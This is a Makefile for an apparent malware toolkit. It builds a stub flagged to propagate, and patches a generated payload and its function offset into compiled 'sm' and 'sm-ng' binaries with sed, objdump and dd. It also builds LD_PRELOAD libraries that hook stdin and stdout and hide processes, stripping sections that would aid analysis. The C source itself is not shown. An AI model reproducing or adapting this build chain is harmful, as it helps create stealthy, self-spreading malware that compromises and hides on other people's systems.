CC = gcc
STRIP = strip

CFLAGS = -Oz -Wall
CFLAGS_LDPRE = -fPIC -shared -ldl

STRIPFLAGS = -s -R .comment
STRIPFLAGS_LDPRE = \
	-R .eh_frame \
	-R .eh_frame_hdr \
	-R .got \
	-R .gnu.version\
	-R .init_array\
	-R .fini_array\

CPPFLAGS = -DPROPERGATE

all: build_stub build_sm build_sm_ng build_stdin_hook build_process_hidder build_stdout_hook

build_stub:
	$(CC) stub.c -o stub $(CFLAGS) $(CPPFLAGS)
	$(STRIP) $(STRIPFLAGS) stub
	du -b stub
	sed -i "s/#define STUB_SIZE [0-9]\+/#define STUB_SIZE $$(du -b stub | cut -f1)/" stub.c
	$(CC) stub.c -o stub $(CFLAGS) $(CPPFLAGS)
	$(STRIP) $(STRIPFLAGS) stub
	du -b stub

build_sm_feeder:
	$(CC) sm_feeder.c -o sm_feeder $(CFLAGS) $(CPPFLAGS)
	$(STRIP) $(STRIPFLAGS) sm_feeder

build_sm: build_sm_feeder
	sed -i "s/#define PAYLOAD \"[^ \"\t\r\n]\+\"/#define PAYLOAD \"$$(./sm_feeder payload)\"/" sm.c
	$(CC) sm.c -o sm $(CFLAGS) $(CPPFLAGS)
	objdump -d sm | sed -n 's/[0-9a-f]\{1,\} <exec_payload>:/&/p' | cut -d ' ' -f 1
	sed -i "s/#define PAYLOAD_FUNCTION_OFFSET 0x[0-9a-f]\+/#define PAYLOAD_FUNCTION_OFFSET 0x$$(objdump -d sm | sed -n 's/[0-9a-f]\{1,\} <exec_payload>:/&/p' | cut -d ' ' -f 1)/" sm.c
	$(CC) sm.c -o sm $(CFLAGS) $(CPPFLAGS)
	objdump -d sm | sed -n 's/[0-9a-f]\{1,\} <exec_payload>:/&/p' | cut -d ' ' -f 1
	$(STRIP) $(STRIPFLAGS) sm

build_sm_ng: build_sm_feeder
	sed -i "s/#define PAYLOAD \"[^ \"\t\r\n]\+\"/#define PAYLOAD \"$$(./sm_feeder payload)\"/" sm-ng.c
	$(CC) sm-ng.c -o sm-ng $(CFLAGS) $(CPPFLAGS)
	objdump -d sm-ng | sed -n 's/[0-9a-f]\{1,\} <exec_payload>:/&/p' | cut -d ' ' -f 1
	sed -i "s/#define PAYLOAD_FUNCTION_OFFSET 0x[0-9a-f]\+/#define PAYLOAD_FUNCTION_OFFSET 0x$$(objdump -d sm-ng | sed -n 's/[0-9a-f]\{1,\} <exec_payload>:/&/p' | cut -d ' ' -f 1)/" sm-ng.c
	sed -i "s/#define PAYLOAD_SIZE [0-9]\+/#define PAYLOAD_SIZE $$(du -b neg_payload | cut -f 1)/" sm-ng.c
	$(CC) sm-ng.c -o sm-ng $(CFLAGS) $(CPPFLAGS)
	objdump -d sm-ng | sed -n 's/[0-9a-f]\{1,\} <exec_payload>:/&/p' | cut -d ' ' -f 1
	dd if=neg_payload of=sm-ng bs=1 conv=notrunc seek=$$(expr 30 + $$(printf "%d" 0x$$(objdump -d sm-ng | sed -n 's/[0-9a-f]\{1,\} <exec_payload>:/&/p' | cut -d ' ' -f 1)))
	$(STRIP) $(STRIPFLAGS) sm-ng

build_stdin_hook:
	$(CC) $(CFLAGS) $(CFLAGS_LDPRE) stdin_hook.c -o libstdinhook.so
	$(STRIP) $(STRIPFLAGS) libstdinhook.so

build_stdout_hook:
	$(CC) $(CFLAGS) $(CFLAGS_LDPRE) stdout_hook.c -o libstdouthook.so
	$(STRIP) $(STRIPFLAGS) libstdouthook.so

build_process_hidder:
	$(CC) $(CFLAGS) $(CFLAGS_LDPRE) -flto process_hider.c -o libprocesshider.so
	$(STRIP) $(STRIPFLAGS) $(STRIPFLAGS_LDPRE) libprocesshider.so
